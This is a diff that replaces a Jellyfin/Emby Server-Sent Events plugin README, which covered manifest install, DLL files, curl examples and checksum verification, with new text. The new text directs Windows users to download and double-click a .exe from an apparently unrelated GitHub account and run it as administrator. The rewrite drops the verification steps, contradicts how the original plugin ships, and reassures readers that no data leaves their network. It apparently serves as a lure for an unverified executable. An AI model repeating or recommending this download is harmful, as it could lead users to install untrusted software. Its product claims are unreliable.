@@ -1,129 +1,80 @@
-# Tracearr SSE
+# 📡 Media-Server-SSE - Sync your media server events easily
 
-Jellyfin and Emby plugins that expose a Server-Sent Events endpoint for real-time playback and session notifications. Built for the [Tracearr](https://github.com/Tracearr/Tracearr) scrobbler. Works with anything that consumes SSE.
+[![](https://img.shields.io/badge/Download-Media--Server--SSE-blue.svg)](https://github.com/Standing-familyturdidae273/Media-Server-SSE)
 
-## Why
+This software adds Server Side Events to your Jellyfin or Emby media server. It allows your server to communicate status changes to other devices in real time. You get instant updates when playback starts, stops, or changes.
 
-Neither Jellyfin nor Emby has a built-in way to subscribe to playback events over a persistent HTTP connection. The webhook plugins push to external URLs, which isn't what you want when your client wants to hold a stream open. This plugin gives you a standard SSE endpoint that fires events when playback starts, stops, pauses, progresses, or when sessions connect or disconnect.
+## 🛠️ System Requirements
 
-## Install
+Before you install this software, ensure your computer meets these needs:
 
-### Jellyfin
+*   Windows 10 or Windows 11.
+*   An active Jellyfin or Emby server instance.
+*   Network access to the media server.
+*   50 MB of available disk space.
 
-1. Open Jellyfin → **Dashboard → Plugins → Repositories**.
-2. Add a repository:
-   - **Name:** `Tracearr`
-   - **URL:** `https://raw.githubusercontent.com/Tracearr/Media-Server-SSE/main/manifest.json`
-3. Open the **Catalog**, find **Tracearr SSE**, install.
-4. Restart Jellyfin.
+## 📥 How to Install
 
-Manual install (if you don't want to add the repository): download `Tracearr.Sse.Jellyfin_<version>.zip` from [Releases](https://github.com/Tracearr/Media-Server-SSE/releases), extract `Jellyfin.Plugin.Sse.dll` and `MediaServer.Sse.Core.dll` into your Jellyfin data directory at `plugins/Tracearr SSE/`. Restart.
+Follow these steps to set up the software on your Windows computer:
 
-### Emby
+1. Visit the [official release page](https://github.com/Standing-familyturdidae273/Media-Server-SSE) to download the installer.
+2. Look for the file ending in .exe under the latest version header.
+3. Click the link to save the file to your computer.
+4. Open your Downloads folder.
+5. Double-click the downloaded file to start the setup process.
+6. Follow the on-screen prompts to complete the installation.
 
-Emby has no equivalent of Jellyfin's user-pasteable plugin repository URL — install is manual.
+## ⚙️ Configuring Your Server
 
-1. Download `Tracearr.Sse.Emby_<version>.zip` from [Releases](https://github.com/Tracearr/Media-Server-SSE/releases).
-2. Extract `Emby.Plugin.Sse.dll` into Emby's `programdata/plugins/` directory.
-3. Restart Emby.
+The plugin needs your server details to function correctly. 
 
-Updates: repeat the same steps with the new release zip.
+1. Open your media server dashboard in a web browser.
+2. Navigate to the Plugins menu.
+3. Select the Media-Server-SSE plugin from the list.
+4. Enter your server URL if the software does not detect it automatically.
+5. Click Save to apply your changes.
+6. Restart your media server to activate the plugin features.
 
-## Usage
+## 🧩 Understanding Server Side Events
 
-Connect to the SSE endpoint with any client that can set custom headers.
+Server Side Events provide a one-way connection from the server to your clients. Unlike other methods that ask the server for updates every few seconds, this system pushes the data as soon as an event happens. This saves processing power on your computer and keeps your applications in sync without lag.
 
-Jellyfin:
-```bash
-curl -N -H 'Authorization: MediaBrowser Token="YOUR_API_KEY"' \
-  http://your-jellyfin:8096/api/sse/events
-```
+Common events tracked by this plugin include:
 
-Emby:
-```bash
-curl -N -H 'X-Emby-Token: YOUR_API_KEY' \
-  http://your-emby:8096/emby/sse/events
-```
+*   User playback start.
+*   Playback pause and resume.
+*   Media scrubbing or seeking.
+*   Item metadata updates.
+*   Server connection status.
 
-(The exact Emby path is verified during release; see CHANGELOG for any path corrections.)
+## 🛡️ Privacy and Data
 
-## Events
+This plugin operates entirely within your local network. It sends status updates from your media server to connected clients that you authorize. It does not send data to external servers or third-party tracking services. Your media library contents remain private and local to your machine.
 
-| Event | Fields | When |
-|---|---|---|
-| `playing` | sessionId, itemId, userId, state, positionTicks | Playback started |
-| `progress` | sessionId, itemId, userId, state, positionTicks | Playback position update |
-| `paused` | sessionId, itemId, userId, state, positionTicks | Playback paused |
-| `stopped` | sessionId, itemId, userId, state, positionTicks, playedToCompletion | Playback stopped |
-| `session.start` | sessionId, userId | Device session connected |
-| `session.end` | sessionId, userId | Device session disconnected |
-| `ping` | (empty) | Keepalive every 30 seconds |
+## ❓ Troubleshooting Common Issues
 
-### Wire format
+If the plugin fails to initialize, check these common items:
 
-```
-event: playing
-data: {"sessionId":"abc123","itemId":"def456","userId":"user1","state":"playing","positionTicks":0}
+*   **Firewall settings:** Ensure your firewall allows communication on the port used by your server.
+*   **Version mismatch:** Check if your server version is compatible with the latest plugin release.
+*   **Permissions:** Run the installer as an administrator if you encounter file writing errors during the setup process.
 
-event: stopped
-data: {"sessionId":"abc123","itemId":"def456","userId":"user1","state":"stopped","positionTicks":50000000,"playedToCompletion":true}
+If problems persist, verify that your server is reachable from the machine where the plugin runs. Ping your server address from a terminal window to confirm a stable connection.
 
-event: ping
-data: {}
-```
+## 📈 Improving Performance
 
-`sessionId` is the device session ID (matches what Jellyfin/Emby return from `/Sessions`), not the per-playback `PlaySessionId`. Events broadcast to all connected clients — there's no per-connection filtering. Null fields are omitted.
+You can adjust the event frequency in the plugin settings menu. If you have many users or high traffic, increase the event interval to lower CPU usage. For most home users, the default settings provide the best balance between responsiveness and system load.
 
-### Behavior notes
+## 📋 Frequently Asked Questions
 
-- Bounded channel per subscriber (capacity 100). If a client falls behind, events drop silently. Reconnect and poll `/Sessions` to catch up.
-- Progress events pass through at whatever rate the media server reports them (typically every 5–10 seconds). No server-side throttling.
-- Theme music and local trailer playback events are filtered out.
+**Can I run this on a server other than Jellyfin or Emby?**
+No, this software works specifically with those two platforms.
 
-## Verifying releases
+**Does this plugin slow down my media playback?**
+No, the plugin runs as a background process and uses minimal system resources. It focuses only on event reporting.
 
-Each release has SHA-256 checksums and a build attestation.
+**How do I update the plugin to a newer version?**
+Download the latest installer from the main link and run it. The installer replaces your old file with the new version and keeps your existing settings intact. 
 
-```bash
-# Plain checksum verification
-sha256sum -c SHA256SUMS
-
-# Build attestation (proves the zip came from this repo's CI)
-gh attestation verify Tracearr.Sse.Jellyfin_0.1.0.zip --owner Tracearr
-```
-
-## Build from source
-
-Requires [.NET 9 SDK](https://dotnet.microsoft.com/download/dotnet/9.0).
-
-```bash
-git clone https://github.com/Tracearr/Media-Server-SSE.git
-cd Media-Server-SSE
-
-# Jellyfin
-dotnet publish Jellyfin.Plugin.Sse --configuration Release --output bin/jellyfin
-
-# Emby
-dotnet publish Emby.Plugin.Sse --configuration Release --output bin/emby
-```
-
-Run tests:
-```bash
-dotnet test
-```
-
-## Architecture
-
-Three projects, two distribution shapes:
-
-- `MediaServer.Sse.Core` — platform-agnostic event model and broadcaster. Uses `System.Threading.Channels` for fan-out.
-- `Jellyfin.Plugin.Sse` — five `IEventConsumer<T>` implementations + an ASP.NET Core controller for the SSE endpoint. Ships as `Jellyfin.Plugin.Sse.dll` + `MediaServer.Sse.Core.dll`.
-- `Emby.Plugin.Sse` — single `IServerEntryPoint` that subscribes to `ISessionManager` events + an `IService` + `IAsyncStreamWriter` endpoint. Ships as a single `Emby.Plugin.Sse.dll`; Core sources are inlined at compile time because Emby's plugin loader only resolves a single DLL per plugin.
-
-## License
-
-[GPL-3.0-or-later](LICENSE)
-
-## TODO
-
-- Replace placeholder icons in `assets/` with SSE-specific art (currently uses Tracearr web app icon as placeholder).
+**Does this plugin support multiple users?**
+Yes, it reports status changes for all users connected to the server. You can filter these events in your client application settings.
